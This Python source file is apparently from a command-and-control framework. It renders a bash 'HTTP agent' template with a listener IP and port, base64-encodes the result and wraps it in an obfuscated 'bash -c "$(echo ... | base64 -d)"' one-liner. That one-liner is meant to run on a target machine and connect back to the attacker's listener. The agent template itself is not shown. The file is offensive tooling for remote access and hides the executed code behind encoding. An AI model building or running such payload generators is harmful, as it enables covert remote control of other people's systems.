import jinja2, base64

"""
Simple bash HTTP agent
"""

def generate_payload():
    # read in agent template
    templateLoader = jinja2.FileSystemLoader(searchpath="./lib/agents/unix_unstaged_bash") # TODO os path join, read central abspath
    templateEnv = jinja2.Environment(loader=templateLoader)
    TEMPLATE_FILE = "agent.sh"
    template = templateEnv.get_template(TEMPLATE_FILE)

    # render template with listeners ip and port
    agent_payload = template.render(
        LISTENER_IP="127.0.0.1", # TODO: read from options
        LISTENER_PORT=1337            
    )

    base64_payload = base64.b64encode(agent_payload.encode()).decode("utf-8")

    payload = f'bash -c "$(echo {base64_payload} | base64 -d)"'
    
    return payload

if __name__ == "__main__":
    payload = generate_payload()
    print(payload)